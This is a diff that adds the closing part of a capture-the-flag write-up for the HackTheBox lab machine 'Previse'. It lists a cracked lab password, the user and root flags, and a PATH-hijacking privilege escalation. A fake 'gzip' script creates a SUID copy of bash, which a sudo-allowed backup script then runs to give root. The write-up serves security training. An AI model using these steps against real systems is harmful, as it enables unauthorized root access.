@@ -1,4 +1,4 @@
-# Previse
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cec1a971-687a-4131-8d61-05d05f79ecb8)# Previse
 > Write-up author: jon-brandy
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/66cdadd8-4e5d-4b69-847e-30c752492d73)
@@ -253,13 +253,117 @@ Analyzing '$🧂llol.'
 
 > RESULT
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6502cf5b-1686-438a-abfb-2b07077e5221)
 
 
+> m4lwhere:ilovecody112235!
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/af90c3f8-2777-4bc0-a739-e11bd70c685e)
 
 
+> GETTING USER FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1383a9a5-f961-4deb-9c97-35a34543333e)
 
 
+## USER FLAG
 
+```
+4a435aafa0d9a36ad374384c7c677614
+```
+
+
+34. Checking sudo permission for m4lwhere shall resulting to this:
+
+```
+m4lwhere@previse:~$ sudo -l
+[sudo] password for m4lwhere: 
+User m4lwhere may run the following commands on previse:
+    (root) /opt/scripts/access_backup.sh
+```
+
+35. Reviewing the access_backup.sh source, we identified that gzip is called without a complete path.
+
+> access_backup.sh
+
+```sh
+m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
+#!/bin/bash
+
+# We always make sure to store logs, we take security SERIOUSLY here
+
+# I know I shouldnt run this as root but I cant figure it out programmatically on my account
+# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
+
+gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
+gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
+```
+
+36. This attack is known as **PATH HIJACKING**.
+37. Let's go to **/tmp** then use this template payload and embed it to a file named **gzip**.
+
+> TEMPLATE PAYLOAD
+
+```
+#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash'
+```
+
+> FULL COMMAND
+
+```
+echo -ne '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash' > gzip
+```
+
+38. Then export the path so it adds the /tmp directory to the beginning of the system's PATH variable, affecting how the system searches for executable files.
+
+```
+export PATH=/tmp:$PATH
+```
+
+39. Then run `chmox +x gzip` and run the **access_backup.sh** script.
+
+> RESULT FROM ALL
+
+```
+m4lwhere@previse:/tmp$ echo -ne '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash' > gzip
+m4lwhere@previse:/tmp$ ls
+gzip
+systemd-private-40a2e03ac44c480fbcf76e94b6bdf71c-apache2.service-UYXjFr
+systemd-private-40a2e03ac44c480fbcf76e94b6bdf71c-systemd-resolved.service-CXO5Ar
+systemd-private-40a2e03ac44c480fbcf76e94b6bdf71c-systemd-timesyncd.service-y0Y4E9
+vmware-root_811-4290756501
+m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
+m4lwhere@previse:/tmp$ chmod +x gzip
+m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh 
+[sudo] password for m4lwhere: 
+m4lwhere@previse:/tmp$ ls -lh
+total 1.1M
+-rwsr-xr-x 1 root     root     1.1M Oct 14 09:28 bash
+-rwxrwxr-x 1 m4lwhere m4lwhere   55 Oct 14 09:24 gzip
+drwx------ 3 root     root     4.0K Oct 14 05:50 systemd-private-40a2e03ac44c480fbcf76e94b6bdf71c-apache2.service-UYXjFr
+drwx------ 3 root     root     4.0K Oct 14 05:50 systemd-private-40a2e03ac44c480fbcf76e94b6bdf71c-systemd-resolved.service-CXO5Ar
+drwx------ 3 root     root     4.0K Oct 14 05:50 systemd-private-40a2e03ac44c480fbcf76e94b6bdf71c-systemd-timesyncd.service-y0Y4E9
+drwx------ 2 root     root     4.0K Oct 14 05:50 vmware-root_811-4290756501
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/64b42cc5-8994-47a8-ab65-80cadcce66c9)
+
+
+40. Finally, simply run **bash -p** and we gained root!
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e14c73ad-1791-445b-9581-9ee894e7e2be)
+
+
+> GETTING ROOT FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a57e6062-1eef-429a-8b67-4adaf970dcbf)
+
+
+## ROOT FLAG
+
+```
+dfe709eac46437ed1d562c13eefa0196
+```
 
 
  
